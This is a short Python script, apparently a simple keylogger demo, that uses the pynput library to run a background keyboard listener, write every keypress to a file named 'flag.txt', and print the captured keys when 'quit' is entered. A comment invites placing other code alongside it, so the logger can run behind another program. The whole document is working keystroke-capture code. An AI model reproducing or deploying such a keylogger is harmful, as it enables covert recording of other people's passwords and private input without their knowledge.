from pynput.keyboard import Key,Listener
import threading

all = []

def pressed(key):
	global all
	all.append(str(key))
	f = open('flag.txt','a')
	f.write(str(key))
	f.close()

def released(key):
	#print("{} key released".format(key))
	pass


def keylog():
	l = Listener(on_press=pressed,on_release=released)
	l.start()


t1 = threading.Thread(target=keylog)
t1.start()

#you can put your own python code here 

text = input("Enter something to quit:")

if text=='quit':
	t1.join()
	print("Printing all the keys that have been logged")
	print(all)
